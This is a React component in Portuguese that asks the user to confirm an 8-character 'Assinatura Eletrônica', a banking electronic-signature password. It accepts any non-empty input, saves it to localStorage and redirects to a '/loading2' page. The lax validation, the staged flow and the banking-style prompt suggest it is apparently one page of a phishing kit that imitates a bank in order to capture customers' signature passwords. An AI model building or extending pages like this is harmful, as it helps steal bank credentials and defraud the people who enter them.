import React, { useState } from 'react';

const Header = () => {
  return (
    <header className="header">
      <img src="mLogomenor.png" alt="Logo" className="logo" />
    </header>
  );
};

const ConfirmPage = () => {
  const [assinaturaEletronica, setAssinaturaEletronica] = useState('');
  const [error, setError] = useState('');

  const handleAssinaturaChange = (e) => {
    const value = e.target.value;
    if (value.length <= 8) {
      setAssinaturaEletronica(value);
    }
  };

  const handleRedirect = () => {
    if (assinaturaEletronica === '' || assinaturaEletronica.length < 1) {
      setError('A assinatura eletrônica deve ter pelo menos 1 caractere.');
    } else {
      setError('');
      // Armazena a assinatura eletrônica no localStorage
      localStorage.setItem('assinaturaEletronica', assinaturaEletronica);
      // Redireciona para a página desejada
      window.location.href = "/loading2";
    }
  };

  return (
    <div style={{ backgroundColor: '#fff', minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
      <Header />
      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'flex-start', padding: '20px' }}>
        <h2 style={{ fontSize: '16px', color: '#282828', alignSelf: 'flex-start', paddingLeft: '3%' }}>Confirme os dados solicitados:</h2>
        <form style={{ width: '100%', maxWidth: '400px', padding: '10px', marginTop: '5%' }}>
          <label htmlFor="assinaturaEletronica" style={{ fontSize: '16px', color: '#282828' }}>
            <b>Assinatura Eletrônica:</b>
          </label>
          <input
            type="password"
            id="assinaturaEletronica"
            name="assinaturaEletronica"
            placeholder="Digite a assinatura eletrônica"
            value={assinaturaEletronica}
            onChange={handleAssinaturaChange}
            style={{
              width: '100%',
              fontSize: '16px',
              border: 'none',
              borderBottom: 'solid 1px #b3b3b3',
              borderRadius: '2px',
              display: 'block',
              color: '#282828',
              padding: '8px',
              height: '36px',
              outline: '0',
              marginTop: '5%',
            }}
          />
          {error && <p style={{ color: 'red', marginTop: '5px' }}>{error}</p>}
          <button
            type="button"
            onClick={handleRedirect}
            style={{
              background: 'url(img/bgbottom.png) repeat',
              borderRadius: '4px',
              fontFamily: 'arial',
              fontSize: '18px',
              color: '#fff',
              padding: '12px',
              textAlign: 'center',
              width: '100%',
              cursor: 'pointer',
              backgroundColor: '#fc990a',
              marginTop: '40px',
            }}
          >
            CONFIRMAR
          </button>
        </form>
      </div>
    </div>
  );
};

export default ConfirmPage;
